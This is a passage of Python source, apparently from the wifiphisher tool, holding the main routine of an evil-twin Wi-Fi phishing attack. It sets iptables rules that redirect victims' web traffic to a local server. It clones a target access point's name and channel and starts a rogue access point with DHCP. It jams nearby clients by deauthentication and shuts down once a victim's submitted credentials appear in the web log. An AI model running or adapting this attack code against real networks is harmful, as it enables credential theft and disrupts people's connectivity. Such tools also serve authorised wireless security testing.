+ R + '-' + W + '] Unable to start HTTPS server!\n' +
            '[' + R + '-' + W + '] Another process is running on port ' + str(SSL_PORT) + '.\n' +
            '[' + R + '!' + W + '] Closing'
        ))
    print ('[' + T + '*' + W + '] Starting HTTPS server at port ' +
           str(SSL_PORT))
    secure_webserver = Thread(target=httpd.serve_forever)
    secure_webserver.daemon = True
    secure_webserver.start()

    # Get interfaces
    reset_interfaces()
    inet_iface = get_internet_interface()
    if not args.jamminginterface:
        mon_iface = get_iface(mode="monitor", exceptions=[inet_iface])
        iface_to_monitor = False
    else:
        mon_iface = False
        iface_to_monitor = args.jamminginterface
    if not mon_iface:
        if args.jamminginterface:
            iface_to_monitor = args.jamminginterface
        else:
            iface_to_monitor = get_strongest_iface()
        if not iface_to_monitor and not inet_iface:
            sys.exit(
                ('[' + R + '-' + W +
                 '] No wireless interfaces found, bring one up and try again'
                 )
            )
        mon_iface = start_mode(iface_to_monitor, "monitor")
    wj_iface = mon_iface
    if not args.apinterface:
        ap_iface = get_iface(mode="managed", exceptions=[iface_to_monitor])
    else:
        ap_iface = args.apinterface

    if inet_iface and inet_iface in [ap_iface, iface_to_monitor]:
        sys.exit(
            ('[' + G + '+' + W + 
            '] Interface %s is connected to the Internet. ' % inet_iface +
            'Please disconnect and rerun the script.\n' +
            '[' + R + '!' + W + '] Closing'
            )
        )


    '''
    We got the interfaces correctly at this point. Monitor mon_iface & for
    the AP ap_iface.
    '''
    # Set iptable rules and kernel variables.
    os.system(
        ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT ' +
         '--to-destination 10.0.0.1:%s' % PORT)
    )
    os.system(
        ('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT ' +
         '--to-destination 10.0.0.1:%s' % SSL_PORT)
    )
    Popen(
        ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
        stdout=DN,
        stderr=PIPE
    )

    print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'

    # Copy AP
    time.sleep(3)
    hop = Thread(target=channel_hop, args=(mon_iface,))
    hop.daemon = True
    hop.start()
    sniffing(mon_iface, targeting_cb)
    channel, essid, ap_mac = copy_AP()
    hop_daemon_running = False

    # Start AP
    start_ap(ap_iface, channel, essid, args)
    dhcpconf = dhcp_conf(ap_iface)
    dhcp(dhcpconf, ap_iface) 
    os.system('clear')
    print ('[' + T + '*' + W + '] ' + T +
           essid + W + ' set up on channel ' +
           T + channel + W + ' via ' + T + mon_iface +
           W + ' on ' + T + str(ap_iface) + W)

    clients_APs = []
    APs = []
    args = parse_args()
    args.accesspoint = ap_mac
    args.channel = channel
    monitor_on = None
    conf.iface = mon_iface
    mon_MAC = mon_mac(mon_iface)
    first_pass = 1

    monchannel = channel
    # Start channel hopping
    hop = Thread(target=channel_hop2, args=(wj_iface,))
    hop.daemon = True
    hop.start()

    # Start sniffing
    sniff_thread = Thread(target=sniff_dot11, args=(wj_iface,))
    sniff_thread.daemon = True
    sniff_thread.start()

    # Main loop.
    try:
        while 1:
            os.system("clear")
            print "Jamming devices: "
            if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
                proc = check_output(['cat', '/tmp/wifiphisher-jammer.tmp'])
                lines = proc.split('\n')
                lines += ["\n"] * (5 - len(lines))
            else:
                lines = ["\n"] * 5
            for l in lines:
                print l
            print "DHCP Leases: "
            if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
                proc = check_output(['cat', '/var/lib/misc/dnsmasq.leases'])
                lines = proc.split('\n')
                lines += ["\n"] * (5 - len(lines))
            else:
                lines = ["\n"] * 5
            for l in lines:
                print l
            print "HTTP requests: "
            if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
                proc = check_output(
                    ['tail', '-5', '/tmp/wifiphisher-webserver.tmp']
                )
                lines = proc.split('\n')
                lines += ["\n"] * (5 - len(lines))
            else:
                lines = ["\n"] * 5
            for l in lines:
                print l
                # We got a victim. Shutdown everything.
                if POST_VALUE_PREFIX in l:
                    time.sleep(2)
                    shutdown()
            time.sleep(0.5)
    except KeyboardInterrupt:
        shutdown()
